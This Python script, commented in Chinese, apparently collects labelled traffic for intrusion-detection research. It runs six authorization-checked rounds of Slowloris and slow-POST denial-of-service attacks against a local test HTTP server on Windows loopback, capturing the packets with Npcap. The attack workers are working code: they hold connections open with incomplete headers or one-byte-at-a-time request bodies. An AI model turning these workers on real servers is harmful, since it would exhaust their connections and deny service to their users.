#!/usr/bin/env python3
"""受控 Slowloris/Slowhttptest 攻击活动采集；仅 win-dev 回环、六批独立组、有界授权。

每组独立引擎、独立 boot/capture、独立输出目录；活动结束后立即停止攻击连接、
释放监听和捕获进程。trainingAllowed 保持 false 直到分区与冻结完成。
不读取 P6 封存特征/标签/分数，不改防火墙规则，不改系统配置。
"""
import argparse
from datetime import datetime, timezone
import hashlib
import ipaddress
import json
from pathlib import Path
import socket
import sys
import threading
import time
import uuid

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'p1'))
from benign_long_tasks import NativeCapture


SCENARIOS = [
    dict(id='controlled_slowloris_g1',   mode='slowloris',    groupOrdinal=1),
    dict(id='controlled_slowloris_g2',   mode='slowloris',    groupOrdinal=2),
    dict(id='controlled_slowloris_g3',   mode='slowloris',    groupOrdinal=3),
    dict(id='controlled_slowhttptest_g1', mode='slowhttptest', groupOrdinal=1),
    dict(id='controlled_slowhttptest_g2', mode='slowhttptest', groupOrdinal=2),
    dict(id='controlled_slowhttptest_g3', mode='slowhttptest', groupOrdinal=3),
]

ISOLATION_SECONDS   = 155
ACTIVITY_SECONDS    = 90
MAX_CONNECTIONS     = 4
LOCAL               = '127.0.0.1'
PEER                = '127.0.0.2'
PORT                = 80
INTERFACE           = r'\Device\NPF_Loopback'


def utc():
    return datetime.now(timezone.utc).isoformat()


def save(path, value):
    with Path(path).open('x', encoding='utf-8') as f:
        json.dump(value, f, ensure_ascii=False, indent=2)
        f.write('\n')


def validate_scope(scope, now=None):
    """逐轮新授权；只允许登记的两个回环地址，不续用历史任务授权。"""
    now = time.time() if now is None else now
    if (scope['local'], scope['peer']) != (LOCAL, PEER):
        raise ValueError('只允许两个已登记回环地址')
    if (ipaddress.ip_address(scope['local']).version != 4
            or scope['port'] != PORT):
        raise ValueError('当前任务仅 IPv4/TCP/80')
    if scope.get('captureInterface') != INTERFACE:
        raise ValueError('只允许登记的 Npcap 回环接口')
    expiry = datetime.fromisoformat(scope['authorizedUntil']).timestamp()
    total  = scope.get('maximumTotalSeconds', 1800)
    if not (now < expiry <= now + total + 60):
        raise ValueError('须提供本轮有效新授权')
    if not scope.get('authorizationId'):
        raise ValueError('缺少授权引用 authorizationId')
    return expiry


# ---------------------------------------------------------------------------
# Slowloris 攻击实现
# ---------------------------------------------------------------------------

def _slowloris_worker(stop_event, result_box, group_id):
    """建立不完整 HTTP 请求，每隔 keepalive 秒追加一个无效头，维持连接打开。"""
    socks = []
    try:
        for _ in range(MAX_CONNECTIONS):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.bind((PEER, 0))
            s.connect((LOCAL, PORT))
            # 发送不完整的请求头——故意不发 \r\n\r\n 结束符
            s.sendall(
                b'GET / HTTP/1.1\r\n'
                b'Host: 127.0.0.1\r\n'
                b'User-Agent: research-slowloris\r\n'
                b'X-Group: ' + group_id.encode() + b'\r\n'
            )
            socks.append(s)
        result_box['connected'] = len(socks)
        interval_count = 0
        while not stop_event.is_set():
            time.sleep(10)
            interval_count += 1
            # 每隔 10 秒追加一个哑头字段，维持服务端 keepalive 超时
            for s in list(socks):
                try:
                    s.sendall(f'X-Keep-{interval_count}: a\r\n'.encode())
                except OSError:
                    socks.remove(s)
    except OSError as e:
        result_box['error'] = str(e)
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
        result_box['closedConnections'] = len(socks)


# ---------------------------------------------------------------------------
# Slowhttptest 攻击实现
# ---------------------------------------------------------------------------

def _slowhttptest_worker(stop_event, result_box, group_id):
    """发送带 Content-Length 的 POST，以极低速率（每 5 秒 1 字节）分片发送请求体。"""
    body_total = 8192
    socks = []
    try:
        for _ in range(MAX_CONNECTIONS):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.bind((PEER, 0))
            s.connect((LOCAL, PORT))
            s.sendall(
                b'POST / HTTP/1.1\r\n'
                b'Host: 127.0.0.1\r\n'
                b'User-Agent: research-slowhttptest\r\n'
                b'X-Group: ' + group_id.encode() + b'\r\n'
                b'Content-Length: ' + str(body_total).encode() + b'\r\n'
                b'\r\n'
            )
            socks.append(s)
        result_box['connected'] = len(socks)
        sent = 0
        while not stop_event.is_set() and sent < body_total:
            time.sleep(5)
            for s in list(socks):
                try:
                    s.sendall(b'a')
                except OSError:
                    socks.remove(s)
            sent += 1
    except OSError as e:
        result_box['error'] = str(e)
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
        result_box['closedConnections'] = len(socks)


# ---------------------------------------------------------------------------
# 靶机 HTTP 服务（只接受已登记对端，永远不主动关闭连接直到客户端断开）
# ---------------------------------------------------------------------------

def _target_server(local, peer, port, records, stop_event):
    """最小化靶机：接受连接、读取请求（永不超时），客户端断开后记录。"""
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Handler(BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'

        def log_message(self, *args):
            pass

        def handle(self):
            # 拒绝非授权对端
            if self.connection.getpeername()[0] != peer:
                self.connection.close()
                return
            begin = time.monotonic()
            try:
                # 把 socket 超时设置得很长，让慢速攻击连接可以维持
                self.connection.settimeout(300)
                super().handle()
            except (ConnectionResetError, BrokenPipeError, TimeoutError):
                pass
            finally:
                elapsed = time.monotonic() - begin
                records.append(dict(peer=peer, elapsedSeconds=round(elapsed, 3)))

        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-Length', '2')
            self.end_headers()
            self.wfile.write(b'OK')

        def do_POST(self):
            # 尝试读取完整 body；慢速攻击会在这里卡住
            length = int(self.headers.get('Content-Length', 0))
            self.rfile.read(length)
            self.send_response(200)
            self.send_header('Content-Length', '2')
            self.end_headers()
            self.wfile.write(b'OK')

    server = ThreadingHTTPServer((local, port), Handler)
    server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    stop_event.wait()
    server.shutdown()
    t.join(5)
    return server.socket.fileno() == -1


# ---------------------------------------------------------------------------
# 单组活动执行
# ---------------------------------------------------------------------------

def run_group(root, scenario, deadline):
    """启动靶机和 Npcap 采集，执行一组攻击，采集结束后清理所有资源。"""
    if time.time() + ACTIVITY_SECONDS + 20 >= deadline:
        raise TimeoutError('剩余授权不足一组')

    root.mkdir(mode=0o700)
    mode      = scenario['mode']
    group_id  = scenario['id']
    activity_id = str(uuid.uuid4())
    server_records = []
    error = None
    capture = None
    server_stop = threading.Event()
    begin = time.monotonic()

    try:
        # 1. 启动 Npcap 采集
        capture = NativeCapture(root)
        capture.thread.start()
        time.sleep(0.15)

        # 2. 启动靶机（独占绑定：端口已占用则失败）
        server_thread = threading.Thread(
            target=_target_server,
            args=(LOCAL, PEER, PORT, server_records, server_stop),
            daemon=True,
        )
        server_thread.start()
        time.sleep(0.15)

        # 3. 启动攻击
        stop_attack = threading.Event()
        result_box  = {}
        worker_fn   = _slowloris_worker if mode == 'slowloris' else _slowhttptest_worker
        attack_thread = threading.Thread(
            target=worker_fn,
            args=(stop_attack, result_box, group_id),
            daemon=True,
        )
        attack_thread.start()

        # 4. 等待活动持续时间
        time.sleep(ACTIVITY_SECONDS)

    except BaseException as exc:
        error = type(exc).__name__ + ': ' + str(exc)
    finally:
        # 5. 停止攻击，先于靶机关闭
        if 'stop_attack' in dir():
            stop_attack.set()
        if 'attack_thread' in dir():
            attack_thread.join(10)

        # 6. 停止靶机
        server_stop.set()
        if 'server_thread' in dir():
            server_thread.join(5)
        time.sleep(0.15)

        # 7. 停止采集，核验零丢包
        captured = capture.close() if capture else None

    elapsed = time.monotonic() - begin
    result = dict(
        activityId=activity_id,
        scenarioId=group_id,
        mode=mode,
        groupOrdinal=scenario['groupOrdinal'],
        elapsedSeconds=round(elapsed, 3),
        attackResult=result_box,
        serverRecords=server_records,
        capture=captured,
        listenerClosed=(captured is not None),
        success=(
            error is None
            and captured is not None
            and captured.get('passed', False)
        ),
        error=error,
        modelFits=0,
        trainingAllowed=False,
    )
    save(root / 'activity.json', result)
    if not result['success']:
        raise RuntimeError(f'活动 {group_id} 失败: {error or captured}')
    return result


# ---------------------------------------------------------------------------
# 主入口
# ---------------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument('--output', type=Path, required=True,
                   help='输出根目录（不得已存在）')
    p.add_argument('--authorized-until', required=True,
                   help='本轮授权截止时间 ISO-8601（如 2026-10-05T23:59:00+08:00）')
    p.add_argument('--authorization-id', required=True,
                   help='与 controlled-attack-authorization.json 对应的授权 ID')
    args = p.parse_args()

    if sys.platform != 'win32':
        raise RuntimeError('仅登记 Windows 回环环境')

    scope = dict(
        local=LOCAL, peer=PEER, port=PORT,
        captureInterface=INTERFACE,
        authorizedUntil=args.authorized_until,
        authorizationId=args.authorization_id,
        maximumTotalSeconds=4000,
    )
    expiry = validate_scope(scope)

    args.output.mkdir(parents=True, exist_ok=False, mode=0o700)
    save(args.output / 'registration.json', dict(
        version='p3-controlled-attack-v1',
        authorizationRef='docs/p3/controlled-attack-authorization.json',
        authorizationId=args.authorization_id,
        local=LOCAL, peer=PEER, servicePort=PORT,
        captureInterface=INTERFACE,
        authorizedUntil=args.authorized_until,
        scenarios=SCENARIOS,
        isolationSeconds=ISOLATION_SECONDS,
        activitySeconds=ACTIVITY_SECONDS,
        maxConnections=MAX_CONNECTIONS,
        firewallChanges=False,
        trainingAllowed=False,
        scriptSha256=hashlib.sha256(Path(__file__).read_bytes()).hexdigest(),
        startedAt=utc(),
    ))

    results = []
    for i, scenario in enumerate(SCENARIOS):
        group_root = args.output / f'group-{i + 1:02}-{scenario["mode"]}-g{scenario["groupOrdinal"]}'
        result = run_group(group_root, scenario, expiry)
        results.append({k: result[k] for k in
                        ('activityId', 'scenarioId', 'mode', 'groupOrdinal',
                         'elapsedSeconds', 'success')})
        print(json.dumps(results[-1]), flush=True)

        if i < len(SCENARIOS) - 1:
            remaining = expiry - time.time()
            if remaining < ISOLATION_SECONDS + ACTIVITY_SECONDS + 20:
                raise TimeoutError('剩余授权不足下一组')
            time.sleep(ISOLATION_SECONDS)

    save(args.output / 'complete.json', dict(
        status='completed',
        groups=len(SCENARIOS),
        completedAt=utc(),
        results=results,
        trainingAllowed=False,
        modelFits=0,
    ))
    print(json.dumps(dict(status='completed', groups=len(results))), flush=True)


if __name__ == '__main__':
    main()
